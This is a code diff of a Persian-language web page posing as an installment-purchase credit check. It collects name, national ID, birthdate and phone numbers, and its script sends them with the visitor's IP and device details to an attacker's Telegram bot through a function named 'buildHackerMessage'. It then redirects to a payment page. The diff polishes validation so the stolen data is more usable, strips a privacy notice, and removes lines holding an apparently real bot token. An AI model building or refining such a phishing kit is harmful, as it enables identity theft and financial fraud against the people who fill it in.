@@ -5,13 +5,17 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>درخواست اعتبارسنجی خرید اقساطی</title>
 
+<!-- تقویم شمسی -->
+<link rel="stylesheet" href="https://unpkg.com/persian-datepicker@1.2.0/dist/css/persian-datepicker.min.css">
+
 <style>
 * { box-sizing: border-box; }
 
 body {
   margin: 0;
   padding: 20px;
-  background: #f1f4f8;
+  background: linear-gradient(135deg, #0d47a1 0%, #1976d2 50%, #42a5f5 100%);
+  min-height: 100vh;
   font-family: Tahoma, Arial, sans-serif;
   color: #263238;
 }
@@ -22,24 +26,27 @@ body {
   background: #fff;
   padding: 25px;
   border-radius: 14px;
-  box-shadow: 0 5px 25px rgba(0,0,0,.08);
+  box-shadow: 0 12px 40px rgba(0,0,0,.25);
+  border-top: 5px solid #0d47a1;
 }
 
 .header {
   text-align: center;
   padding-bottom: 15px;
-  border-bottom: 1px solid #eee;
+  border-bottom: 1px solid #e3ecf5;
 }
 
 .header h2 {
-  color: #174b76;
+  color: #0d47a1;
   font-size: 21px;
+  margin: 0 0 10px;
 }
 
 .header p {
-  color: #687782;
+  color: #546e7a;
   font-size: 13px;
   line-height: 2;
+  margin: 0;
 }
 
 label {
@@ -47,27 +54,47 @@ label {
   font-size: 13px;
   font-weight: bold;
   margin: 16px 0 7px;
+  color: #0d47a1;
 }
 
 input {
   width: 100%;
   padding: 13px;
-  border: 1px solid #ccd5df;
+  border: 1.5px solid #c5d8ec;
   border-radius: 8px;
   font-size: 14px;
   outline: none;
+  background: #f8fbff;
+  transition: all .2s;
+  direction: ltr;
+  text-align: right;
 }
 
-input:focus { border-color: #1769aa; }
+input:focus {
+  border-color: #1976d2;
+  background: #fff;
+  box-shadow: 0 0 0 3px rgba(25,118,210,.12);
+}
+
+input.invalid {
+  border-color: #e53935;
+  background: #ffebee;
+}
+
+input.valid {
+  border-color: #43a047;
+  background: #f1f8e9;
+}
 
 .fee {
-  background: #edf5ff;
-  color: #174b76;
+  background: linear-gradient(135deg, #e3f2fd, #bbdefb);
+  color: #0d47a1;
   border-radius: 8px;
   padding: 16px;
   text-align: center;
   font-weight: bold;
   margin-top: 20px;
+  border: 1px solid #90caf9;
 }
 
 .consent {
@@ -86,25 +113,66 @@ button {
   padding: 15px;
   border: none;
   border-radius: 8px;
-  background: #1769aa;
+  background: linear-gradient(135deg, #0d47a1, #1976d2);
   color: white;
   font-size: 16px;
+  font-weight: bold;
   cursor: pointer;
+  transition: all .2s;
 }
 
-button:disabled { background: #8798a8; cursor: not-allowed; }
+button:hover:not(:disabled) {
+  background: linear-gradient(135deg, #1565c0, #2196f3);
+  box-shadow: 0 6px 18px rgba(13,71,161,.35);
+}
 
-.notice {
-  color: #687782;
-  font-size: 11px;
-  line-height: 2;
-  margin-top: 18px;
+button:disabled {
+  background: #90a4ae;
+  cursor: not-allowed;
 }
 
 #status {
   text-align: center;
   font-size: 13px;
   margin-top: 15px;
+  padding: 10px;
+  border-radius: 6px;
+  line-height: 1.8;
+  word-break: break-word;
+}
+
+#status.error {
+  background: #ffebee;
+  color: #c62828;
+  border: 1px solid #ef9a9a;
+}
+
+#status.success {
+  background: #e8f5e9;
+  color: #2e7d32;
+  border: 1px solid #a5d6a7;
+}
+
+#status.info {
+  background: #e3f2fd;
+  color: #1565c0;
+  border: 1px solid #90caf9;
+}
+
+.hint {
+  font-size: 11px;
+  color: #78909c;
+  margin-top: 4px;
+  display: block;
+}
+
+/* استایل تقویم شمسی */
+.datepicker-plot-area {
+  font-family: Tahoma, Arial, sans-serif !important;
+}
+
+.datepicker-day-view .table-days td.selected span {
+  background: #1976d2 !important;
 }
 </style>
 </head>
@@ -122,22 +190,25 @@ button:disabled { background: #8798a8; cursor: not-allowed; }
     </p>
   </div>
 
-  <form id="requestForm">
+  <form id="requestForm" novalidate>
 
     <label for="fullname">نام و نام خانوادگی</label>
     <input type="text" id="fullname" autocomplete="name" required>
+    <span class="hint">حداقل ۳ حرف</span>
 
     <label for="nationalId">کد ملی</label>
-    <input type="text" id="nationalId" inputmode="numeric" maxlength="10" required>
+    <input type="text" id="nationalId" inputmode="numeric" maxlength="10" placeholder="۱۰ رقم" required>
+    <span class="hint">۱۰ رقم معتبر با الگوریتم کد ملی</span>
 
     <label for="birthdate">تاریخ تولد</label>
-    <input type="text" id="birthdate" placeholder="مثلاً ۱۳۷۵/۰۵/۲۰" required>
+    <input type="text" id="birthdate" placeholder="برای انتخاب کلیک کنید" readonly required>
 
     <label for="mobile">شماره موبایل</label>
-    <input type="tel" id="mobile" placeholder="09xxxxxxxxx" required>
+    <input type="tel" id="mobile" placeholder="09123456789" maxlength="11" required>
+    <span class="hint">۱۱ رقم، شروع با 09</span>
 
     <label for="phone">شماره تماس جایگزین (اختیاری)</label>
-    <input type="tel" id="phone" placeholder="شماره تماس">
+    <input type="tel" id="phone" placeholder="02188888888" maxlength="11">
 
     <div class="fee">
       هزینه بررسی درخواست: ۵,۰۰۰ تومان
@@ -159,36 +230,59 @@ button:disabled { background: #8798a8; cursor: not-allowed; }
 
   </form>
 
-  <div class="notice">
-    اطلاعات شخصی باید فقط از طریق بستر امن و با رضایت
-    کاربر پردازش شوند. هزینه اعلام‌شده و شرایط پرداخت
-    باید پیش از ثبت درخواست به کاربر اطلاع داده شوند.
-  </div>
-
 </div>
+
+<!-- jQuery + تقویم شمسی -->
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script src="https://unpkg.com/persian-date@1.1.0/dist/persian-date.min.js"></script>
+<script src="https://unpkg.com/persian-datepicker@1.2.0/dist/js/persian-datepicker.min.js"></script>
 
 <script>
 /* ============================================================
    ⚙️ تنظیمات تلگرام — این دو مقدار را جایگزین کنید
    ============================================================ */
-const BOT_TOKEN = "9096438309:AAFPh7QKmFAHl3WPiz5T_MPUghRSSj-s75Y";
-const CHAT_ID   = "-1003803727270";
+const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+const CHAT_ID   = "YOUR_CHAT_ID_HERE";
 
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 const IP_API       = "https://api.ipify.org?format=json";
 
 /* ============================================================
-   ابزارهای کمکی
+   تقویم شمسی
    ============================================================ */
+$(document).ready(function () {
+  $("#birthdate").persianDatepicker({
+    format: "YYYY/MM/DD",
+    initialValue: false,
+    autoClose: true,
+    calendar: {
+      persian: {
+        locale: "fa",
+        leapYearMode: "algorithmic"
+      }
+    },
+    navigator: {
+      scroll: { enabled: true }
+    },
+    toolbox: {
+      calendarSwitch: { enabled: false },
+      todayButton: { enabled: true, text: { fa: "امروز" } },
+      submitButton: { enabled: true, text: { fa: "تایید" } }
+    },
+    timePicker: { enabled: false },
+    observer: true
+  });
+});
 
-// تبدیل اعداد فارسی/عربی به انگلیسی
+/* ============================================================
+   ابزارها
+   ============================================================ */
 function normalizeDigits(value) {
   return value
     .replace(/[۰-۹]/g, d => "۰۱۲۳۴۵۶۷۸۹".indexOf(d))
     .replace(/[٠-٩]/g, d => "٠١٢٣٤٥٦٧٨٩".indexOf(d));
 }
 
-// فرار دادن کاراکترهای HTML برای جلوگیری از خرابی parse_mode
 function escapeHTML(str) {
   return String(str)
     .replace(/&/g, "&amp;")
@@ -196,7 +290,17 @@ function escapeHTML(str) {
     .replace(/>/g, "&gt;");
 }
 
-// گرفتن IP کاربر
+// اعتبارسنجی واقعی کد ملی ایران
+function isValidNationalId(id) {
+  if (!/^[0-9]{10}$/.test(id)) return false;
+  if (/^(\d)\1{9}$/.test(id)) return false; // همه ارقام یکسان
+  const check = +id[9];
+  let sum = 0;
+  for (let i = 0; i < 9; i++) sum += (+id[i]) * (10 - i);
+  const r = sum % 11;
+  return (r < 2 && check === r) || (r >= 2 && check === 11 - r);
+}
+
 async function getUserIP() {
   try {
     const res = await fetch(IP_API);
@@ -207,35 +311,63 @@ async function getUserIP() {
   }
 }
 
-// گرفتن اطلاعات دستگاه کاربر
 function getDeviceInfo() {
   const ua = navigator.userAgent;
-  let browser = "نامشخص";
-  let os = "نامشخص";
-
-  if (/Edg\//.test(ua))                       browser = "Edge";
-  else if (/OPR\//.test(ua))                  browser = "Opera";
-  else if (/Chrome\//.test(ua))               browser = "Chrome";
-  else if (/Firefox\//.test(ua))              browser = "Firefox";
-  else if (/Safari\//.test(ua))               browser = "Safari";
-
-  if (/Windows NT 10/.test(ua))               os = "Windows 10/11";
-  else if (/Windows/.test(ua))                os = "Windows";
-  else if (/Android/.test(ua))                os = "Android";
-  else if (/iPhone|iPad|iPod/.test(ua))       os = "iOS";
-  else if (/Mac OS X/.test(ua))               os = "macOS";
-  else if (/Linux/.test(ua))                  os = "Linux";
-
+  let browser = "نامشخص", os = "نامشخص";
+  if (/Edg\//.test(ua)) browser = "Edge";
+  else if (/OPR\//.test(ua)) browser = "Opera";
+  else if (/Chrome\//.test(ua)) browser = "Chrome";
+  else if (/Firefox\//.test(ua)) browser = "Firefox";
+  else if (/Safari\//.test(ua)) browser = "Safari";
+  if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
+  else if (/Windows/.test(ua)) os = "Windows";
+  else if (/Android/.test(ua)) os = "Android";
+  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
+  else if (/Mac OS X/.test(ua)) os = "macOS";
+  else if (/Linux/.test(ua)) os = "Linux";
   return { browser, os };
 }
 
-// ساخت قالب پیام هکری
+/* ============================================================
+   اعتبارسنجی آنی (real-time)
+   ============================================================ */
+const fields = {
+  fullname:   document.getElementById("fullname"),
+  nationalId: document.getElementById("nationalId"),
+  birthdate:  document.getElementById("birthdate"),
+  mobile:     document.getElementById("mobile"),
+  phone:      document.getElementById("phone")
+};
+
+fields.nationalId.addEventListener("input", function () {
+  this.value = normalizeDigits(this.value).replace(/\D/g, "").slice(0, 10);
+  this.classList.toggle("valid",   isValidNationalId(this.value));
+  this.classList.toggle("invalid", this.value.length === 10 && !isValidNationalId(this.value));
+});
+
+fields.mobile.addEventListener("input", function () {
+  this.value = normalizeDigits(this.value).replace(/\D/g, "").slice(0, 11);
+  const ok = /^09[0-9]{9}$/.test(this.value);
+  this.classList.toggle("valid", ok);
+  this.classList.toggle("invalid", this.value.length === 11 && !ok);
+});
+
+fields.phone.addEventListener("input", function () {
+  this.value = normalizeDigits(this.value).replace(/\D/g, "").slice(0, 11);
+});
+
+fields.fullname.addEventListener("input", function () {
+  const ok = this.value.trim().length >= 3;
+  this.classList.toggle("valid", ok);
+  this.classList.toggle("invalid", this.value.length > 0 && !ok);
+});
+
+/* ============================================================
+   ساخت پیام هکری
+   ============================================================ */
 function buildHackerMessage(data) {
   const { fullname, nationalId, birthdate, mobile, phone, ip, browser, os, time } = data;
-
-  // خط کپی‌شونده (فونت اصلی، با یک کلیک در تلگرام کپی می‌شود)
-  const copyLine =
-    `${fullname} | ${nationalId} | ${birthdate} | ${mobile} | ${phone || "-"} | ${ip}`;
+  const copyLine = `${fullname} | ${nationalId} | ${birthdate} | ${mobile} | ${phone || "-"} | ${ip}`;
 
   return (
 `\`\`\`ansi
@@ -269,52 +401,55 @@ function buildHackerMessage(data) {
 }
 
 /* ============================================================
-   فرم و ارسال
+   فرم
    ============================================================ */
-
 const form      = document.getElementById("requestForm");
 const button    = document.getElementById("submitButton");
 const statusBox = document.getElementById("status");
 
+function setStatus(msg, type) {
+  statusBox.textContent = msg;
+  statusBox.className = type || "";
+}
+
 form.addEventListener("submit", async function (event) {
   event.preventDefault();
 
-  const fullname   = document.getElementById("fullname").value.trim();
-  const nationalId = normalizeDigits(document.getElementById("nationalId").value.trim());
-  const birthdate  = document.getElementById("birthdate").value.trim();
-  const mobile     = normalizeDigits(document.getElementById("mobile").value.trim());
-  const phone      = normalizeDigits(document.getElementById("phone").value.trim());
+  const fullname   = fields.fullname.value.trim();
+  const nationalId = normalizeDigits(fields.nationalId.value.trim());
+  const birthdate  = fields.birthdate.value.trim();
+  const mobile     = normalizeDigits(fields.mobile.value.trim());
+  const phone      = normalizeDigits(fields.phone.value.trim());
 
-  /* ---------- اعتبارسنجی ---------- */
+  /* --- اعتبارسنجی --- */
   if (!document.getElementById("agree").checked) {
-    statusBox.textContent = "لطفاً موافقت خود را ثبت کنید.";
-    return;
+    setStatus("لطفاً موافقت خود را ثبت کنید.", "error"); return;
   }
-
-  if (!/^[0-9]{10}$/.test(nationalId)) {
-    statusBox.textContent = "کد ملی باید ۱۰ رقم باشد.";
-    return;
+  if (fullname.length < 3) {
+    setStatus("نام و نام خانوادگی حداقل ۳ حرف باشد.", "error"); return;
   }
-
+  if (!isValidNationalId(nationalId)) {
+    setStatus("کد ملی وارد شده معتبر نیست.", "error"); return;
+  }
+  if (!birthdate) {
+    setStatus("لطفاً تاریخ تولد را انتخاب کنید.", "error"); return;
+  }
   if (!/^09[0-9]{9}$/.test(mobile)) {
-    statusBox.textContent = "شماره موبایل معتبر وارد کنید.";
-    return;
+    setStatus("شماره موبایل باید ۱۱ رقم و با 09 شروع شود.", "error"); return;
+  }
+  if (phone && !/^[0-9]{8,11}$/.test(phone)) {
+    setStatus("شماره تماس جایگزین معتبر نیست.", "error"); return;
   }
 
-  if (!fullname || !birthdate) {
-    statusBox.textContent = "لطفاً همه اطلاعات ضروری را تکمیل کنید.";
-    return;
-  }
-
+  /* --- بررسی تنظیمات --- */
   if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
-    statusBox.textContent = "تنظیمات تلگرام هنوز کامل نشده است.";
+    setStatus("⚠️ BOT_TOKEN و CHAT_ID هنوز تنظیم نشده‌اند. فایل را ویرایش کنید.", "error");
     return;
   }
 
-  /* ---------- شروع ارسال ---------- */
   button.disabled = true;
   button.textContent = "در حال ارسال...";
-  statusBox.textContent = "";
+  setStatus("در حال ارسال به تلگرام...", "info");
 
   try {
     const userIP = await getUserIP();
@@ -340,17 +475,26 @@ form.addEventListener("submit", async function (event) {
     const tgData = await tgRes.json();
 
     if (!tgData.ok) {
-      throw new Error(tgData.description || "Telegram error");
+      // پیام خطای دقیق تلگرام
+      throw new Error(tgData.description || "خطای نامشخص تلگرام");
     }
 
-    // موفق — ادامه به صفحه پرداخت
-    statusBox.textContent = "درخواست با موفقیت ثبت شد. در حال انتقال...";
-    window.location.href = "./Pay/";
+    setStatus("✅ درخواست با موفقیت ثبت شد. در حال انتقال به پرداخت...", "success");
+    setTimeout(() => { window.location.href = "./Pay/"; }, 1200);
 
   } catch (error) {
-    console.error(error);
-    statusBox.textContent =
-      "ارسال درخواست انجام نشد. لطفاً دوباره تلاش کنید.";
+    console.error("Telegram error:", error);
+    let msg = "ارسال درخواست انجام نشد. ";
+    if (error.message.includes("chat not found")) {
+      msg += "CHAT_ID اشتباه است یا ربات را استارت نکرده‌اید.";
+    } else if (error.message.includes("Unauthorized")) {
+      msg += "BOT_TOKEN نامعتبر است.";
+    } else if (error.message.includes("Failed to fetch")) {
+      msg += "اتصال اینترنت یا فیلترشکن را بررسی کنید.";
+    } else {
+      msg += error.message;
+    }
+    setStatus("❌ " + msg, "error");
     button.disabled = false;
     button.textContent = "ادامه و پرداخت";
   }
